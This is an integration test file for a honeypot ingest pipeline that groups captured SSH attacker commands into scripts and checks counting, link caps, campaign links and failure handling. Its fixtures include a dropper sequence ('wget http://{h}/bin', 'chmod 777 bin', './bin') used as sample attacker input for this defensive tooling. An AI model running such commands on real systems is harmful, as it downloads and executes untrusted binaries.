"""Script library against a real TimescaleDB, as the ingest role."""

import json
import os
from datetime import UTC, datetime, timedelta
from pathlib import Path
from typing import Any

import pytest
from sqlalchemy import text
from sqlalchemy.ext.asyncio import AsyncEngine, AsyncSession, async_sessionmaker

from ingest.features import FeatureSettings
from ingest.scripts import ScriptWorker, load_annotations

pytestmark = [
    pytest.mark.integration,
    pytest.mark.skipif(not os.environ.get("POSTGRES_HOST"), reason="POSTGRES_HOST not set"),
]

BASE = load_annotations(Path(__file__).resolve().parents[1] / "rules")
NOW = datetime.now(UTC)
DROPPER = ["cd /tmp", "wget http://{h}/bin", "chmod 777 bin", "./bin {h}"]


@pytest.fixture(autouse=True)
async def clean(engine: AsyncEngine) -> None:
    async with engine.begin() as conn:
        await conn.execute(text("DELETE FROM scripts"))  # links, explanations, requests cascade
        await conn.execute(text("DELETE FROM campaign_keys"))
        await conn.execute(text("DELETE FROM campaigns"))
        await conn.execute(text("DELETE FROM system_status WHERE key = 'scripts_cursor'"))


async def seed(
    engine: AsyncEngine,
    sid: str,
    ip: str,
    commands: list[str],
    *,
    age_min: int = 60,
    benign: bool = False,
) -> None:
    last = NOW - timedelta(minutes=age_min)
    async with engine.begin() as conn:
        await conn.execute(
            text(
                """
                INSERT INTO sessions (session_id, sensor, src_ip, src_port, dst_port, started_at,
                                      last_event_at, commands, benign)
                VALUES (:sid, 'ssh', CAST(:ip AS inet), 40000, 22, :start, :last, :n, :benign)
                """
            ),
            {"sid": sid, "ip": ip, "start": last - timedelta(minutes=1), "last": last,
             "n": len(commands), "benign": benign},
        )  # fmt: skip
        for i, cmd in enumerate(commands):
            await conn.execute(
                text(
                    """
                    INSERT INTO events (ts, sensor, session_id, type, src_ip, src_port, dst_port,
                                        data)
                    VALUES (:ts, 'ssh', :sid, 'command', CAST(:ip AS inet), 40000, 22,
                            CAST(:data AS jsonb))
                    """
                ),
                {"ts": last - timedelta(seconds=30 - i), "sid": sid, "ip": ip,
                 "data": json.dumps({"input": cmd, "demo": True})},
            )  # fmt: skip


async def rows(engine: AsyncEngine, sql: str, **params: Any) -> list[Any]:
    async with engine.connect() as conn:
        return list((await conn.execute(text(sql), params)).all())


def worker(factory: async_sessionmaker[AsyncSession], **kw: Any) -> ScriptWorker:
    return ScriptWorker(FeatureSettings(scripts_enabled=True), factory, BASE, **kw)


async def test_sessions_become_scripts_counted_once_and_explained(
    engine: AsyncEngine, factory: async_sessionmaker[AsyncSession]
) -> None:

    def drop(h: str) -> list[str]:
        return [c.format(h=h) for c in DROPPER]

    await seed(engine, "a", "203.0.113.1", drop("192.0.2.10"))
    await seed(engine, "b", "203.0.113.2", drop("198.51.100.20"))
    await seed(engine, "c", "203.0.113.1", ["uname -a", "cat /proc/cpuinfo"])
    await seed(engine, "d", "203.0.113.3", ["uname -a"])  # one command: no script
    await seed(engine, "e", "203.0.113.4", drop("192.0.2.11"), age_min=2)  # still active
    await seed(engine, "f", "203.0.113.5", drop("192.0.2.12"), benign=True)

    w = worker(factory)
    await w.run_once()
    scripts = await rows(
        engine, "SELECT id, sessions, sources, line_count, demo, sensors FROM scripts ORDER BY id"
    )
    assert len(scripts) == 2
    dropper = next(s for s in scripts if s.line_count == 3)
    assert (dropper.sessions, dropper.sources, dropper.demo) == (2, 2, True)
    assert dropper.sensors == ["ssh"]
    expl = await rows(engine, "SELECT source, prompt_version, summary FROM script_explanations")
    assert {e.source for e in expl} == {"annotations"} and len(expl) == 2
    assert all(e.prompt_version == BASE.version for e in expl)
    assert any("downloads a file" in e.summary for e in expl)

    await w.run_once()  # nothing new: counters must not move
    again = await rows(engine, "SELECT sessions, sources FROM scripts ORDER BY id")
    assert [(r.sessions, r.sources) for r in again] == [(s.sessions, s.sources) for s in scripts]

    fresh = worker(factory)  # a restart reads the progress marker, not the clock
    await fresh.run_once()
    assert (await rows(engine, "SELECT sum(sessions) AS n FROM scripts"))[0].n == 3

    await seed(engine, "g", "203.0.113.2", drop("192.0.2.77"), age_min=30)
    await w.run_once()
    row = (await rows(engine, "SELECT sessions, sources FROM scripts WHERE line_count = 3"))[0]
    assert (row.sessions, row.sources) == (3, 2)  # known address: sessions grow, sources do not


async def test_links_are_capped_but_counters_keep_counting(
    engine: AsyncEngine, factory: async_sessionmaker[AsyncSession]
) -> None:
    for i in range(4):
        await seed(engine, f"s{i}", f"203.0.113.{i + 1}", ["uname -a", "id"], age_min=60 - i)
    await worker(factory, link_cap=2).run_once()
    s = (await rows(engine, "SELECT id, sessions, sources FROM scripts"))[0]
    links = await rows(
        engine, "SELECT count(*) AS n FROM script_sessions WHERE script_id = :i", i=s.id
    )
    assert links[0].n == 2 and s.sessions == 4
    assert s.sources == 4  # all four were new while the first batch was linked


async def test_campaign_and_rule_changes_are_picked_up(
    engine: AsyncEngine, factory: async_sessionmaker[AsyncSession]
) -> None:
    await seed(engine, "a", "203.0.113.1", ["uname -a", "id"])
    w = worker(factory)
    await w.run_once()
    sc = (await rows(engine, "SELECT id, encode(fingerprint, 'hex') AS fp FROM scripts"))[0]
    async with engine.begin() as conn:
        cid = (
            await conn.execute(
                text(
                    """
                    INSERT INTO campaigns (name, status, first_seen, last_seen, severity)
                    VALUES ('Test campaign', 'active', now(), now(), 'notice') RETURNING id
                    """
                )
            )
        ).scalar_one()
        await conn.execute(
            text(
                "INSERT INTO campaign_keys (kind, value, campaign_id, sources, first_seen, "
                "last_seen) VALUES ('script', :v, :c, 2, now(), now())"
            ),
            {"v": sc.fp, "c": cid},
        )
        await conn.execute(
            text("UPDATE script_explanations SET prompt_version = 0 WHERE script_id = :i"),
            {"i": sc.id},
        )
    await w.run_once()
    got = (await rows(engine, "SELECT campaign_id FROM scripts"))[0]
    assert got.campaign_id == cid
    ver = (await rows(engine, "SELECT prompt_version FROM script_explanations"))[0]
    assert ver.prompt_version == BASE.version  # rebuilt after the rule files "changed"


# ---- bounds and failure isolation ---------------------------------------------------------------
async def test_a_session_with_thousands_of_commands_is_read_in_bounded_rows(
    engine: AsyncEngine, factory: async_sessionmaker[AsyncSession]
) -> None:
    last = NOW - timedelta(minutes=60)
    async with engine.begin() as conn:
        await conn.execute(
            text(
                """
                INSERT INTO sessions (session_id, sensor, src_ip, src_port, dst_port, started_at,
                                      last_event_at, commands)
                VALUES ('big', 'ssh', '203.0.113.7', 40000, 22, :start, :last, 6000)
                """
            ),
            {"start": last - timedelta(minutes=30), "last": last},
        )
        await conn.execute(
            text(
                """
                INSERT INTO events (ts, sensor, session_id, type, src_ip, src_port, dst_port, data)
                SELECT CAST(:start AS timestamptz) + make_interval(secs => g * 0.1), 'ssh', 'big', 'command',
                       '203.0.113.7', 40000, 22,
                       jsonb_build_object('input', 'echo ' || g || ' ' || repeat('x', 40))
                FROM generate_series(1, 6000) AS g
                """
            ),
            {"start": last - timedelta(minutes=29)},
        )
    w = worker(factory)
    await w.run_once()
    assert w.rows_read <= 64  # not 6,000 rows of up to 1 KiB
    sc = (await rows(engine, "SELECT line_count, length(sample_text) AS n FROM scripts"))[0]
    assert sc.line_count == 64 and sc.n <= 8192


async def test_long_lines_and_a_failing_group_do_not_stop_the_cycle(
    engine: AsyncEngine,
    factory: async_sessionmaker[AsyncSession],
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    long_line = "echo " + "a b " * 40  # more than 32 tokens: the normaliser keeps 32
    await seed(engine, "ok1", "203.0.113.1", ["uname -a", "id"], age_min=90)
    await seed(engine, "bad", "203.0.113.2", ["whoami", "id", "uname"], age_min=80)
    await seed(engine, "ok2", "203.0.113.3", [long_line, "uname -a"], age_min=70)
    w = worker(factory)
    real = w._store_group

    async def flaky(db: AsyncSession, fp: str, members: list[Any]) -> None:
        if members[0].session_id == "bad":
            await db.execute(text("SELECT 1/0"))
        await real(db, fp, members)

    monkeypatch.setattr(w, "_store_group", flaky)
    await w.run_once()
    assert w.skipped == 1
    got = await rows(engine, "SELECT line_count FROM scripts ORDER BY line_count")
    assert [r.line_count for r in got] == [2, 2]  # the other two groups were stored
    lines = (await rows(engine, "SELECT lines FROM script_explanations"))[0].lines
    assert all(len(item["text"]) <= 300 for item in lines)
    cursor = await rows(engine, "SELECT value FROM system_status WHERE key = 'scripts_cursor'")
    assert cursor and cursor[0].value["session_id"] in {"ok2", ""}  # it moved past the failure


async def test_past_the_link_cap_a_re_read_is_not_counted_twice(
    engine: AsyncEngine, factory: async_sessionmaker[AsyncSession]
) -> None:
    for i in range(3):
        await seed(engine, f"s{i}", f"203.0.113.{i + 1}", ["uname -a", "id"], age_min=90 - i)
    w = worker(factory, link_cap=1)
    await w.run_once()
    await engine_exec(engine, "DELETE FROM system_status WHERE key = 'scripts_cursor'")
    await worker(factory, link_cap=1).run_once()  # the marker is lost: everything is re-read
    s = (await rows(engine, "SELECT sessions FROM scripts"))[0]
    assert s.sessions == 3


async def engine_exec(engine: AsyncEngine, sql: str) -> None:
    async with engine.begin() as conn:
        await conn.execute(text(sql))
